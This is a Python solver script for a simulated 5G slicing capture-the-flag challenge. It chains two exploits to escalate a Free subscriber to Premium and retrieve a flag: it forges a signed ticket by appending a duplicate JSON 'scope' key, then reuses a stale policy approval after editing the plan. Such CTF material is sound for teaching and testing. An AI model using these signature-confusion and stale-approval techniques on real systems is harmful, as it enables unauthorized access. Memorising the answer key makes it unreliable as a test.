#!/usr/bin/env python3
"""Organizer solver; prints each decision and a final evidence object."""

import argparse
import base64
import json
import re
import socket
import sys

PROMPT = b"nr-ue> "
ANSI = re.compile(r"\x1b\[[0-9;]*m")


def forge_handover_ticket(token):
    """Exploit the v1 first-member/v2 last-member JSON disagreement."""
    body, signature = token.split(".", 1)
    raw = base64.b64decode(body + "=" * (-len(body) % 4), altchars=b"-_")
    text = raw.decode("ascii")
    if '"scope":"inspect"' not in text or not text.endswith("}"):
        raise RuntimeError("Unexpected ticket payload.")
    # The legacy verifier signs the first scope; the consumer reads the last one.
    forged = text[:-1] + ',"scope":"handover"}'
    encoded = base64.urlsafe_b64encode(forged.encode()).decode().rstrip("=")
    return encoded + "." + signature


class Client:
    def __init__(self, host, port):
        self.socket = socket.create_connection((host, port), timeout=5)
        self.socket.settimeout(5)
        self.pending = b""
        self.banner = self.read_prompt()

    def close(self):
        self.socket.close()

    def read_prompt(self):
        while PROMPT not in self.pending:
            chunk = self.socket.recv(4096)
            if not chunk:
                raise RuntimeError("Service disconnected before the prompt.")
            self.pending += chunk
            if len(self.pending) > 65536:
                raise RuntimeError("Response exceeded 64 KiB.")
        reply, self.pending = self.pending.split(PROMPT, 1)
        return ANSI.sub("", reply.decode("utf-8"))

    def command(self, command):
        self.socket.sendall(command.encode() + b"\n")
        return self.read_prompt()


def solve(host, port, progress=print):
    client = Client(host, port)
    try:
        def step(number, explanation, command, expected):
            progress(f"[{number}] {explanation}\n> {command}")
            response = client.command(command)
            progress(response.rstrip())
            if expected not in response:
                raise RuntimeError(f"Expected {expected!r} after {command!r}.")
            return response

        client.command("color off")
        step(1, "Authenticate the Free subscriber.", "register", "Registration accepted")
        step(2, "Authorize the subscribed source slice.",
             "authorize 1 000001 internet", "Allowed NSSAI: 1-000001")
        step(3, "Establish the source PDU session.", "session internet", "PDU session established: Free")
        step(4, "Verify that Free can use the captive portal.", "surf portal", "Free captive portal")
        step(5, "Verify that the source route cannot reach the Vault.", "surf vault", "403")
        ticket_reply = step(6, "Export the one-use diagnostic ticket.", "ticket export", "TICKET ")
        ticket_match = re.search(r"^TICKET (\S+)$", ticket_reply, re.MULTILINE)
        if not ticket_match:
            raise RuntimeError("Ticket export did not return a token.")
        forged_ticket = forge_handover_ticket(ticket_match.group(1))
        step(7, "Use the legacy/new ticket decoder disagreement to obtain handover scope.",
             "ticket import " + forged_ticket, "Broker capability: handover")
        plan_reply = step(8, "Create a Premium handover plan through the broker.",
                          "plan create 1 000099 internet", "PLAN ")
        plan_match = re.search(r"^PLAN ([0-9a-f]+)$", plan_reply, re.MULTILINE)
        if not plan_match:
            raise RuntimeError("Plan creation did not return an identifier.")
        plan = plan_match.group(1)
        step(9, "Stage the subscribed Free target so policy will sign it.",
             "plan edit " + plan + " 1 000001 internet", "Plan updated")
        approval_reply = step(10, "Request a signed approval for the Free target.",
                              "plan check " + plan, "APPROVAL ")
        approval_match = re.search(r"^APPROVAL (\S+)$", approval_reply, re.MULTILINE)
        if not approval_match:
            raise RuntimeError("Policy check did not return a receipt.")
        approval = approval_match.group(1)
        step(11, "Replace the plan target with Premium after the receipt is issued.",
             "plan edit " + plan + " 1 000099 internet", "Plan updated")
        step(12, "Confirm that the approval survived the plan revision.",
             "plan show " + plan, '"approval_present": true')
        step(13, "Ask policy to reject the Premium plan and observe the stale receipt remains.",
             "plan check " + plan, "not included")
        step(14, "Commit the old Free receipt against the mutable Premium plan.",
             "plan commit " + approval, "Allowed NSSAI: 1-000099")
        step(15, "Install the Premium route selected by the committed plan.",
             "session internet", "PDU session established: Premium")
        response = step(16, "Retrieve the Vault response through that route.",
                        "surf vault", "Vault: 200 OK")
        flag_lines = [line.strip() for line in response.splitlines()
                      if re.fullmatch(r"[^\s{}]+\{[^\r\n{}]+\}", line.strip())]
        if len(flag_lines) != 1:
            raise RuntimeError("Vault did not return exactly one flag.")
        evidence = json.loads(client.command("evidence"))
        required = {"scenario_id": "sui5g-free-surfing", "challenge_version": 2,
                    "mode": "SIMULATED",
                    "subscription": "FREE", "subscribed_nssai": "1-000001",
                    "authorized_nssai": "1-000099", "active_nssai": "1-000099",
                    "handover_capability": True, "committed_plan": plan,
                    "impact_verified": True}
        if any(evidence.get(k) != v for k, v in required.items()):
            raise RuntimeError("Service evidence does not prove Free-to-Premium access.")
        evidence["flag"] = flag_lines[0]
        return evidence
    finally:
        client.close()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=1337)
    parser.add_argument("--json", action="store_true", help="Print only the final evidence JSON")
    args = parser.parse_args()
    try:
        result = solve(args.host, args.port, (lambda _: None) if args.json else print)
    except (OSError, RuntimeError, ValueError) as error:
        print(f"Solver failed: {error}", file=sys.stderr)
        return 1
    print(json.dumps(result, indent=2, sort_keys=True))
    return 0


if __name__ == "__main__":
    sys.exit(main())
